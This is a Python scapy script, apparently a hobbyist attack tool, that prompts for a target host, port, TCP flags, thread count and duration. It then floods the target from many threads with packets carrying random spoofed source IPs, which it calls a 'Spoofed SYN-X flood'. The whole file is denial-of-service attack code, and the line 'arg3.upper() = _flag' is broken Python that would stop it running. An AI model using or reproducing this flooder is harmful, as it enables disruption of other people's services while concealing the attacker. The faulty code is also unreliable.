from scapy.all import *
from colorama import Fore
import time, threading, sys, random, string

_abort = False
_flag = ''

def _xsyn(_ip, _prt):
    while _abort == False:
        try:
            # spoof your IP
            _fake = ".".join(map(str, (randint(0,255)for _ in range(4))))
            
            # craft packet
            template = IP(dst=_ip, src=_fake)/TCP()
            template[TCP].flags = _flag
            pkt = []
            pkt.extend(template)
            pkt[0][TCP].dport=int(_prt)
            
            send(pkt, verbose=False)
        except:
            pass

def _rslv(_host):
    from urllib.parse import urlparse
    try:
        xhost = _host.lower()
        if not (xhost.startswith("http://") or xhost.startswith("https://")):
            xhost = "http://" + xhost
         
        _domain = urlparse(xhost).netloc
        _eip = socket.gethostbyname(_domain)
        return _eip
    except:
        sys.exit()
        
def main():
    global _abort, _flag
    try:
        arg1 = input('\r\n\033[1m \033[34mIP/URL: \033[31m')
        arg1 = _rslv(arg1)
        arg2 = input(' \033[34mPORT: \033[31m')
        print('''\r\n\033[34m Available flag/s:
 (F)inish    (R)eset    (P)ush    (A)cknowledge
 (U)rge      (E)CN-Echo (C)ongestion Window Reduced\r\n''')
        arg3 = input(' \033[34mFLAG/S: \033[31m')
        _thdz = input(' \033[34mTHREAD/S: \033[31m')
        _time = input(' \033[34mSECONDS: \033[31m')
    except KeyboardInterrupt:
        sys.exit()
    
    z = input('\r\n\033[37m Ready? Strike <ENTER> to attack and <CTRL+C> to quit...')
    arg3.upper() = _flag
        
    print('\r\n\r\n ---> Spoofed SYN-X flood sent to ' + arg1 + ' for ' + _time + ' seconds!')
    tasks = []
    for x in range(0, int(_thdz)):
        x = threading.Thread(target=_xsyn, args=(arg1, arg2))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(_time)
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit()
    
if __name__ == "__main__":
    main()
